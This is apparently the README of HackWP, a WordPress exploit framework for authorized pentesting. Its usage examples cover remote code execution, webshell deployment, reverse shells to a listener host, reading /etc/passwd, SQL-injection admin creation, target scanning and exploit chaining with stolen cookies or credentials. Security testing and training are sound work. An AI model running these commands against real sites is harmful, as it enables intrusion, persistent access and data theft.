# HWP — HackWP Framework

[![Version](https://img.shields.io/github/v/tag/etragardh/hackwp?label=version&color=cyan)](https://github.com/etragardh/hackwp/releases)
[![Python](https://img.shields.io/badge/python-3.10+-blue)](https://python.org)
[![License](https://img.shields.io/badge/use-authorized%20testing%20only-red)](https://github.com/etragardh/hackwp)
[![HackWP](https://img.shields.io/badge/hackwp.io-API-orange)](https://hackwp.io)

WordPress exploit framework for authorized pentesting and security training.

## Installation

```bash
gh repo clone etragardh/hackwp
cd hackwp
chmod +x hwp.py
sudo ln -s ${PWD}/hwp.py /usr/local/bin/hwp
```

Install dependencies:

```bash
pip install packaging requests rich textual httpx
```

## Quick Start

```bash
# Interactive mode (default — just run it)
hwp

# Run an exploit with a payload
hwp -t http://target.com --exploit hwp-training/1.0.0-rce --payload bash --cmd "whoami"

# Deploy a webshell
hwp -t http://target.com --exploit hwp-training/1.0.0-rce --payload webshell

# Upload webshell via file upload vulnerability
hwp -t http://target.com --exploit hwp-training/1.0.0-afu --payload webshell

# Deploy via RFI (payload has hosted URL — no server needed)
hwp -t http://target.com --exploit hwp-training/1.0.0-rfi --payload webshell

# Deploy via RFI with server fallback (payload has no hosted URL)
hwp -t http://target.com --exploit hwp-training/1.0.0-rfi --payload revshell --lhost 10.0.0.5 --lport 8888

# Reverse shell
hwp -t http://target.com --exploit hwp-training/1.0.0-rce --payload revshell --lhost 10.0.0.5

# Read a file
hwp -t http://target.com --exploit hwp-training/1.0.0-lfi --payload file_read --file /etc/passwd

# Create admin user via SQL injection
hwp -t http://target.com --exploit hwp-training/1.0.0-sqlinj --payload admin_user

# Scan target
hwp -t http://target.com --scan
```

## Scanner

The built-in scanner fingerprints a WordPress target and checks for known vulnerabilities using the HackWP vulnerability database.

```bash
# Full scan (core, themes, plugins, users, security)
hwp -t http://target.com --scan

# Aggressive mode — probe all known plugin slugs from vuln DB
hwp -t http://target.com --scan --aggressive 1

# Very aggressive — probe all vuln DB slugs with HEAD+GET verification
hwp -t http://target.com --scan --aggressive 2

# Scan specific components only
hwp -t http://target.com --scan --enumerate plugins,users
```

The scanner detects WordPress version, active theme and version, installed plugins with versions, enumerated users, and security misconfigurations including XML-RPC, debug.log exposure, open registration, directory listing, wp-cron, server headers, security headers, and robots.txt.

Scan results are cached in `~/.hwp_cache/scans/` and automatically used by the interactive TUI for exploit matching.

## Scan Intel in TUI

When you scan a target and then open the interactive TUI, HWP cross-references scan results with available exploits. The TUI shows:

- `« confirmed` (red) next to exploits that match a detected plugin/theme with a vulnerable version
- `« possible` (yellow) next to exploits where the plugin/theme is present but version couldn't be confirmed
- Confirmed and possible exploits are sorted to the top of the exploit list
- Press **F2** to toggle scan filter — hides exploits that don't match the scan data
- The description pane shows a **Scan Intel** section with WP version (green/red based on vulnerabilities), theme version, plugin count, enumerated users with IDs, and security findings

This means you can scan a target, then immediately see which exploits are relevant without reading through the full list.

## Exploit Chaining

```bash
# Auth chain: create session, then use authenticated exploit
hwp -t http://target.com --exploit hwp-training/1.0.0-auth hwp-training/1.0.0-rce --payload bash --cmd "id"

# Object injection with POP chain
hwp -t http://target.com --exploit hwp-training/1.0.0-objinj hwp-training/1.0.0-pop-rce --payload php --code "phpinfo();"

# Provide cookie directly
hwp -t http://target.com --exploit hwp-training/1.0.0-rce --payload bash --cmd "id" --cookie "wordpress_logged_in=abc"

# Provide credentials — framework logs in via wp-login.php automatically
hwp -t http://target.com --exploit hwp-training/1.0.0-rce --payload bash --cmd "id" --user admin --pass secret
```

## Verbose Output

```bash
hwp -t ... --exploit ... -v     # Show exploit progress details
hwp -t ... --exploit ... -vv    # Debug: show raw Result fields
```

## List Available Modules

```bash
hwp --list-exploits
hwp --list-payloads
```

## Writing Your Own

- **[Creating Exploits](docs/creating-exploits.md)** — How to write an exploit module
- **[Creating Payloads](docs/creating-payloads.md)** — How to write a payload module
- **[Framework Internals](docs/framework.md)** — Chain resolution, auth flow, output rules

Templates are available at `exploits/template/` and `payloads/template/`.

## Session Management

Sessions are stored in `~/.hwp/` and reused across runs:

```bash
# Clear stored session for a target
hwp -t target.com --clear-session
```

## License

Security testing tool by [@etragardh](https://github.com/etragardh). For authorized pentest and security testing only.
